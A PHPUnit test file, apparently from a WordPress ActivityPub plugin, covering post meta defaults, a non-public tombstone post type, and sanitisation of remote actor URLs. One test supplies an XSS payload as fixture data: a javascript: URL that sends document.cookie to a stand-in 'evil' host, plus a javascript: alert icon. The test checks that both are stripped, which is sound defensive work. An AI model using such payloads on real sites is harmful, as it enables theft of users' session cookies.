<?php
/**
 * Test file for Post Types.
 *
 * @package Activitypub
 */

namespace Activitypub\Tests;

use Activitypub\Collection\Remote_Actors;
use Activitypub\Post_Types;

/**
 * Test class for Post Types.
 *
 * @coversDefaultClass \Activitypub\Post_Types
 */
class Test_Post_Types extends \WP_UnitTestCase {

	/**
	 * Set up test environment.
	 */
	public function set_up(): void {
		parent::set_up();
		Post_Types::init();
	}

	/**
	 * Test prevent_empty_post_meta method.
	 *
	 * @covers ::prevent_empty_post_meta
	 */
	public function test_prevent_empty_post_meta() {
		$post_id = self::factory()->post->create( array( 'post_author' => 1 ) );

		// Storing the default value should be prevented.
		\update_post_meta( $post_id, 'activitypub_max_image_attachments', ACTIVITYPUB_MAX_IMAGE_ATTACHMENTS );
		$this->assertFalse( \metadata_exists( 'post', $post_id, 'activitypub_max_image_attachments' ) );

		// Storing a non-default value should work.
		\update_post_meta( $post_id, 'activitypub_max_image_attachments', ACTIVITYPUB_MAX_IMAGE_ATTACHMENTS + 3 );
		$this->assertTrue( \metadata_exists( 'post', $post_id, 'activitypub_max_image_attachments' ) );
		$this->assertEquals( ACTIVITYPUB_MAX_IMAGE_ATTACHMENTS + 3, \get_post_meta( $post_id, 'activitypub_max_image_attachments', true ) );

		\delete_post_meta( $post_id, 'activitypub_max_image_attachments' );
	}

	/**
	 * Test that the ap_tombstone post type is registered and non-public.
	 *
	 * @covers ::register_tombstone_post_type
	 */
	public function test_ap_tombstone_post_type_registered() {
		$this->assertTrue( \post_type_exists( 'ap_tombstone' ) );

		$post_type = \get_post_type_object( 'ap_tombstone' );
		$this->assertFalse( $post_type->public );
		$this->assertFalse( $post_type->publicly_queryable );
		$this->assertFalse( $post_type->show_ui );
		$this->assertFalse( $post_type->show_in_rest );
		$this->assertFalse( $post_type->delete_with_user );
		$this->assertTrue( $post_type->exclude_from_search );
	}

	/**
	 * A remote actor's URL and icon are attacker-controlled and stored verbatim,
	 * so the actor_info REST field must strip script-executing schemes before the
	 * admin UI renders them as links.
	 *
	 * @covers ::register_ap_actor_rest_field
	 */
	public function test_actor_info_rest_field_sanitizes_dangerous_urls() {
		Post_Types::register_ap_actor_rest_field();

		$post_id = Remote_Actors::create(
			array(
				'id'                => 'https://remote.example.com/actor/mallory',
				'type'              => 'Person',
				'url'               => "javascript:fetch('//evil/?c='+document.cookie)",
				'icon'              => array(
					'type' => 'Image',
					'url'  => 'javascript:alert(document.domain)',
				),
				'inbox'             => 'https://remote.example.com/actor/mallory/inbox',
				'name'              => 'Mallory',
				'preferredUsername' => 'mallory',
			)
		);
		$this->assertIsInt( $post_id );

		$info = $this->get_actor_info( $post_id );

		$this->assertSame( '', $info['url'], 'A javascript: actor URL should be stripped.' );
		$this->assertSame( '', $info['icon'], 'A javascript: icon URL should be stripped.' );
	}

	/**
	 * Legitimate http(s) actor URLs must pass through the actor_info REST field untouched.
	 *
	 * @covers ::register_ap_actor_rest_field
	 */
	public function test_actor_info_rest_field_preserves_safe_urls() {
		Post_Types::register_ap_actor_rest_field();

		$post_id = Remote_Actors::create(
			array(
				'id'                => 'https://remote.example.com/actor/alice',
				'type'              => 'Person',
				'url'               => 'https://remote.example.com/@alice',
				'icon'              => array(
					'type' => 'Image',
					'url'  => 'https://remote.example.com/avatar.png',
				),
				'inbox'             => 'https://remote.example.com/actor/alice/inbox',
				'name'              => 'Alice',
				'preferredUsername' => 'alice',
			)
		);
		$this->assertIsInt( $post_id );

		$info = $this->get_actor_info( $post_id );

		$this->assertSame( 'https://remote.example.com/@alice', $info['url'] );
		$this->assertSame( 'https://remote.example.com/avatar.png', $info['icon'] );
	}

	/**
	 * Invoke the registered actor_info REST field callback for a given actor post.
	 *
	 * @param int $post_id Remote actor post ID.
	 * @return array The actor_info payload.
	 */
	private function get_actor_info( $post_id ) {
		global $wp_rest_additional_fields;

		$callback = $wp_rest_additional_fields[ Remote_Actors::POST_TYPE ]['actor_info']['get_callback'];

		return \call_user_func( $callback, array( 'id' => $post_id ) );
	}
}
